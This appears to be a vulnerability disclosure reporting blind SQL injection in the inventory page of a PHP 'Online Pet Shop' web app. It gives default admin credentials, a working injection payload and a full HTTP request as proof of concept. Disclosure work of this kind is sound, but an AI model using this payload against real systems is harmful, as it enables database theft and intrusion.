# Online Pet Shop We App v1.0 by oretnom23 has SQL injection

BUG_Author: hegeoo

Login account: admin/admin123 (Super Admin account)

vendors: https://www.sourcecodester.com/php/14839/online-pet-shop-we-app-using-php-and-paypal-free-source-code.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /pet_shop/admin/?page=inventory/manage_inventory&id=

Vulnerability location: /pet_shop/admin/?page=inventory/manage_inventory&id=,id

dbname=pet_shop_db,length=11

[+] Payload: /pet_shop/admin/?page=inventory/manage_inventory&id=8%27%20and%20length(database())%20=11--+ // Leak place ---> id

```sql
GET /pet_shop/admin/?page=inventory/manage_inventory&id=8%27%20and%20length(database())%20=11--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=k8u390ikl968phg971gmpmhtj5
Connection: close
```

length=11
![image](https://user-images.githubusercontent.com/54017627/185290165-6accbfef-4706-4ef1-a4ad-6a865687e045.png)


length=12
![image](https://user-images.githubusercontent.com/54017627/185290226-200835e6-49e5-443a-8fa6-8e62808b1b32.png)
